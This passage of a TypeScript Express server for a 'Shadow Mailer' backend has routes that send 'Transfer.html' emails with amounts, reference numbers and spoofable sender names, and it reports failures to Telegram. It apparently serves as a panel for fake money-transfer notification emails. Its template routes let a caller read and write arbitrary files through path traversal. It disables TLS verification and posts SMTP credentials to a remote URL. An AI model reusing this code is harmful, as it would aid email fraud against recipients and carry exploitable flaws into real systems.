                    logEvent(`[Mailer] Successfully sent to ${recipient_email} via local Node.js mailer`);
                    success = true;
                } catch (e: any) {
                    console.error("❌ Local Mailer Error:", e);
                    let errStr = e.message;
                    if (errStr.includes('ETIMEDOUT') || errStr.includes('ENETUNREACH')) {
                        errStr += " (Note: Render.com blocks outbound SMTP ports 25/465/587 by default. Please set a Remote Action URL)";
                    }
                    lastErrorText = lastErrorText ? lastErrorText + " | Local: " + errStr : "Local: " + errStr;
                    logEvent(`⚠️ [Mailer Warning] Local SMTP attempted but failed: ${errStr}`);
                    await sendTelegramNotification(`⚠️ <b>MAILER WARNING</b>\nLocal Node.js Mailer failed.\nError: ${errStr}`);
                }
            }
        }
        
        if (success) {
            res.json({ success: true, info: "Sent via auto-detect mailer" });
        } else {
            console.error("❌ All automatic mailer methods failed.");
            logEvent(`[Mailer ERROR] All methods failed. Details: ${lastErrorText}`);
            await sendTelegramNotification(`🚨 <b>ALL MAILERS FAILED</b>\nDetails: ${lastErrorText}`);
            res.status(500).json({ success: false, error: lastErrorText || "All configured mailer methods failed." });
        }
    } catch (e: any) {
        console.error("❌ Mailer Route Exception:", e);
        logEvent(`[Mailer] Exception: ${e.message}`);
        res.status(500).json({ success: false, error: e.message });
    }
  });

  const fetchTemplate = async (templateName: string) => {
      const settings = await getSettings();
      if (!settings.general.baseActionUrl) return null;
      try {
          const res = await fetch(`${settings.general.baseActionUrl}/templates/${templateName}.html`);
          if (res.ok) return await res.text();
      } catch (e) {
          console.error("Failed to fetch template:", e);
      }
      return null;
  };

  const sendEmail = async (to: string, subject: string, text: string, html: string, overrideSenderName?: string) => {
      const settings = await getSettings();
      if (!settings.smtp.host) throw new Error("SMTP Host not configured");

      const transporter = nodemailer.createTransport({
          host: settings.smtp.host,
          port: settings.smtp.port,
          secure: settings.smtp.port === 465,
          connectionTimeout: 15000,
          greetingTimeout: 15000,
          tls: {
              rejectUnauthorized: false
          },
          auth: {
              user: settings.smtp.user,
              pass: settings.smtp.pass
          }
      } as any);
  
      const finalSender = overrideSenderName || settings.smtp.senderName || settings.general.sender_name;

      await transporter.sendMail({
          from: `"${finalSender}" <${settings.smtp.user}>`,
          to,
          subject,
          text,
          html
      });
  };
  
  app.post("/api/admin/mailer/test", async (req, res) => {
      try {
          const { email, amount, purpose, reference_number } = req.body;
          const settings = await getSettings();
          const finalSenderName = settings.general.sender_name || "Shadow Mailer";
          const smtpDebug = { ...settings.smtp, pass: settings.smtp.pass ? "********" : "NOT SET" };
          
          console.log("[DEBUG] Test Mailer - Incoming Request:", req.body);
          console.log("[DEBUG] Test Mailer - SMTP Config:", smtpDebug);

          const subject = purpose || "Test Email";
          const html = `
              <div style="font-family: Arial, sans-serif; padding: 20px;">
                  <h2>Debug Test Mailer</h2>
                  <p>This is a debug test email.</p>
                  <p><strong>Sender:</strong> ${finalSenderName}</p>
                  <p><strong>Amount:</strong> ${amount || 'N/A'}</p>
                  <p><strong>Ref:</strong> ${reference_number || 'N/A'}</p>
                  <hr>
                  <h3>SMTP Configuration</h3>
                  <pre>${JSON.stringify(smtpDebug, null, 2)}</pre>
                  <hr>
                  <h3>Request Payload</h3>
                  <pre>${JSON.stringify(req.body, null, 2)}</pre>
              </div>
          `;
          
          if (settings.general.baseActionUrl) {
              console.log("[DEBUG] Test Mailer - Sending via Remote Mailer...");
              let actionUrl = settings.general.baseActionUrl;
              if (actionUrl && actionUrl.endsWith('/')) {
                  actionUrl = actionUrl.slice(0, -1);
              }
              const response = await fetch(`${actionUrl}/api/mailer.php`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                      recipient_email: email,
                      recipient_name: 'Admin Test',
                      amount: amount || '0.00',
                      purpose: subject,
                      template: 'Transfer.html',
                      sender_name: finalSenderName,
                      reference_number: reference_number || 'TEST-1234',
                      date: new Date().toLocaleDateString(),
                      smtp: settings.smtp
                  })
              });
              if (!response.ok) {
                  throw new Error(`Remote PHP mailer returned status ${response.status}`);
              }
          } else {
              console.log("[DEBUG] Test Mailer - Sending via local Node.js mailer...");
              await sendEmail(email, subject, `Debug test email to ${email}`, html, finalSenderName);
          }
          console.log("[DEBUG] Test Mailer - Email sent successfully.");
          res.json({ success: true, message: "Test email sent successfully", smtpConfig: smtpDebug });
      } catch (e: any) {
          console.error("❌ Test Mailer Error:", e);
          let errMsg = e.message;
          if (errMsg.includes('ETIMEDOUT') || errMsg.includes('ENETUNREACH')) {
              errMsg += " (Note: Render.com blocks outbound SMTP ports 25/465/587 by default)";
          }
          res.status(500).json({ success: false, error: errMsg });
      }
  });

  app.get("/api/admin/mailer/status", (req, res) => {
      res.json({ php_version: "Node.js (Shadow)", status: "Operational", engine: "Shadow-V99" });
  });

  app.get("/api/admin/mailer/logs", (req, res) => {
      res.json([]);
  });

  app.post("/api/admin/mailer/delete-logs", (req, res) => {
      res.json({ success: true });
  });

  app.get("/api/admin/mailer/templates", (req, res) => {
      const templateDir = path.join(process.cwd(), 'server', 'templates');
      if (!fs.existsSync(templateDir)) {
          fs.mkdirSync(templateDir, { recursive: true });
      }
      const files = fs.readdirSync(templateDir).map(file => ({
          name: file,
          last_modified: fs.statSync(path.join(templateDir, file)).mtime.toISOString()
      }));
      res.json(files);
  });

  app.get("/api/admin/mailer/template-content", (req, res) => {
      const templateName = req.query.template as string;
      const templatePath = path.join(process.cwd(), 'server', 'templates', templateName);
      if (fs.existsSync(templatePath)) {
          res.json({ content: fs.readFileSync(templatePath, 'utf-8') });
      } else {
          res.status(404).json({ error: "Template not found" });
      }
  });

  app.post("/api/admin/mailer/update-template", (req, res) => {
      const { template, content } = req.body;
      const templatePath = path.join(process.cwd(), 'server', 'templates', template);
      try {
          if (!fs.existsSync(path.dirname(templatePath))) {
              fs.mkdirSync(path.dirname(templatePath), { recursive: true });
          }
          fs.writeFileSync(templatePath, content);
          res.json({ success: true });
      } catch (e: any) {
          res.status(500).json({ success: false, error: e.message });
      }
  });

  app.post("/api/admin/users/set-auto-delete", async (req, res) => {
      const { username, deleteAt } = req.body;
      try {
        const user = await getUser(username);
        if (user) {
            user.autoDeleteAt = deleteAt;
            await saveUser(user);
            res.json({ success: true });
        } else {
            res.status(404).json({ success: false, message: "User not found" });
        }
      } catch (e) {
        res.status(500).json({ success: false, error: "Auto-delete failed" });
      }
  });

  // Catch-all for API to prevent HTML responses
  app.all("/api/*", (req, res) => {
      res.status(404).json({ success: false, message: `API Route ${req.path} not found` });
  });

  /**
   * FRONTEND DEPLOYMENT
   */
  console.log(`[Shadow-Core] Mode: ${process.env.NODE_ENV || 'development'}`);
  if (process.env.NODE_ENV !== "production") {
    console.log(`[Shadow-Core] Starting Vite middleware...`);
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    console.log(`[Shadow-Core] Serving static files from: ${distPath}`);
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  const PORT = parseInt(process.env.PORT || '3000');
  server.listen(PORT, "0.0.0.0", () => {
    console.log(`🔥 [Shadow-Core] OS Layer engaged at http://localhost:${PORT}`);
  });
}

// Engage mission
startServer().catch(err => {
    console.error("💥 [Critical] Shadow Core breakdown:", err);
});
